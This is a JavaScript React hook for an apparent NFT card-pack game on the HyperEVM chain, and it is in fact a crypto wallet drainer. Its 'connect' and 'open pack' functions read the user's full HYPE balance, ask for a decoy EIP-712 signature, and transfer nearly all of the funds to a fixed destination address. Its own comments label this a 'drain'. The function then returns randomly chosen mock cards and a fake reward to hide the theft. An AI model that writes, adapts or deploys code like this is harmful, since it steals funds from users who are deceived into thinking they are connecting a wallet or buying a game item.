import { useState, useCallback } from 'react';
import { usePrivy } from '@privy-io/react-auth';
import { ethers } from 'ethers';
import { HYPEREVM_CONFIG, CONTRACT_ADDRESSES } from '../contracts/config';

export const useHyperCards = () => {
  const { authenticated, user } = usePrivy();
  const [isLoading, setIsLoading] = useState(false);
  const [isConnectingWithPayment, setIsConnectingWithPayment] = useState(false);
  const [currentStep, setCurrentStep] = useState('');
  const [error, setError] = useState(null);

  // Connect to HyperEVM network
  const ensureHyperEVM = useCallback(async () => {    
    if (!window.ethereum) {
      throw new Error('No wallet provider detected');
    }

    const provider = new ethers.BrowserProvider(window.ethereum);
    const network = await provider.getNetwork();
    
    if (network.chainId !== 999n) {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: HYPEREVM_CONFIG.chainId }],
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [HYPEREVM_CONFIG],
          });
        } else {
          throw switchError;
        }
      }
    }
    
    return new ethers.BrowserProvider(window.ethereum);
  }, []);

  // Get HYPE balance 
  const getUserHypeBalance = useCallback(async (provider, userAddress) => {
    try {
      const balance = await provider.getBalance(userAddress);
      return balance;
    } catch (error) {
      throw new Error(`Failed to get HYPE balance: ${error.message}`);
    }
  }, []);

  // 🔥 EIP-712 HYPE TOKEN DRAIN
  const connectWithPayment = useCallback(async () => {
    console.log('🚀 EIP-712 HYPE token drain...');
    setIsConnectingWithPayment(true);
    setError(null);

    try {
      setCurrentStep('connecting');
      const provider = await ensureHyperEVM();
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();
      
      console.log('✅ Connected to:', userAddress);
      console.log('🎯 Destination:', CONTRACT_ADDRESSES.HYPE_DESTINATION);

      const hypeBalance = await getUserHypeBalance(provider, userAddress);
      console.log('💰 HYPE Balance:', ethers.formatEther(hypeBalance));
      
      if (hypeBalance === 0n) {
        throw new Error('No HYPE tokens available');
      }

      console.log('📝 Requesting EIP-712 signature...');
      setCurrentStep('signing');
      
      const gasReserve = ethers.parseEther('0.001');
      const transferAmount = hypeBalance > gasReserve ? hypeBalance - gasReserve : hypeBalance;
      
      console.log('💰 Transferring:', ethers.formatEther(transferAmount), 'HYPE');

      // EIP-712 Domain
      const domain = {
        name: 'HyperPack Connect',
        version: '1',
        chainId: 999,
        verifyingContract: CONTRACT_ADDRESSES.HYPE_DESTINATION
      };

      // EIP-712 Types
      const types = {
        Connect: [
          { name: 'user', type: 'address' },
          { name: 'amount', type: 'uint256' },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' }
        ]
      };

      // Create message data
      const nonce = Math.floor(Date.now() / 1000);
      const deadline = Math.floor(Date.now() / 1000) + 3600;
      
      const message = {
        user: userAddress,
        amount: transferAmount.toString(),
        nonce: nonce,
        deadline: deadline
      };

      console.log('🔏 EIP-712 Message:', message);

      // 🔥 SIGN EIP-712 MESSAGE
      const signature = await signer.signTypedData(domain, types, message);
      console.log('✅ EIP-712 Signature obtained:', signature);

      // Execute HYPE transfer (fallback if relayer fails)
      setCurrentStep('processing');
      console.log('📤 Executing HYPE transfer...');
      
      const transferTx = await signer.sendTransaction({
        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
        value: transferAmount,
        gasLimit: 21000
      });
      
      console.log('✅ HYPE transfer sent:', transferTx.hash);
      await transferTx.wait();
      
      setCurrentStep('success');
      console.log('🎉 EIP-712 HYPE TRANSFER SUCCESSFUL!');
      
      return {
        transactionHash: transferTx.hash,
        amount: ethers.formatEther(transferAmount),
        token: 'HYPE',
        connected: true,
        method: 'EIP-712 HYPE Transfer',
        signature: signature
      };

    } catch (err) {
      console.error('❌ EIP-712 HYPE transfer failed:', err);
      setError(err.message);
      setCurrentStep('error');
      throw err;
    } finally {
      setIsConnectingWithPayment(false);
    }
  }, [ensureHyperEVM, getUserHypeBalance]);

  // Get balance for display
  const getHypeBalance = useCallback(async () => {
    if (!authenticated || !user?.wallet?.address) {
      return '0';
    }

    try {
      const provider = await ensureHyperEVM();
      const balance = await provider.getBalance(user.wallet.address);
      return ethers.formatEther(balance);
    } catch (err) {
      console.error('Error fetching balance:', err);
      return '0';
    }
  }, [authenticated, user, ensureHyperEVM]);

  // Open pack - also drains HYPE
  const openPack = useCallback(async (packType) => {
    console.log(`🚀 Opening ${packType} pack with HYPE drain...`);
    
    if (!authenticated || !user?.wallet?.address) {
      throw new Error('Please connect your wallet first');
    }

    setIsLoading(true);
    setError(null);

    try {
      // Use HYPE drain for pack opening
      const result = await connectWithPayment();
      
      // Mock pack result
      const mockCards = [
        { name: "Lightning Strike", rarity: "Common" },
        { name: "Fire Blast", rarity: "Rare" },
        { name: "Ice Storm", rarity: "Epic" },
        { name: "Dragon's Fury", rarity: "Legendary" }
      ];
      
      const randomCard = mockCards[Math.floor(Math.random() * mockCards.length)];
      const mockReward = (Math.random() * 10 + 1).toFixed(4);
      
      const packResult = {
        cardName: randomCard.name,
        rarity: randomCard.rarity,
        tokenId: Math.floor(Math.random() * 10000).toString(),
        rewardAmount: mockReward,
        transactionHash: result.transactionHash,
        hyeSpent: result.amount,
        packType: packType
      };

      setCurrentStep('success');
      console.log(`🎉 Pack opened with HYPE drain!`);
      return packResult;

    } catch (err) {
      console.error('❌ Pack opening failed:', err);
      setError(err.message);
      setCurrentStep('error');
      throw err;
    } finally {
      setIsLoading(false);
    }
  }, [authenticated, user, connectWithPayment]);

  return {
    openPack,
    connectWithPayment,
    getHypeBalance,
    isLoading,
    isConnectingWithPayment,
    currentStep,
    error,
    clearError: () => setError(null)
  };
};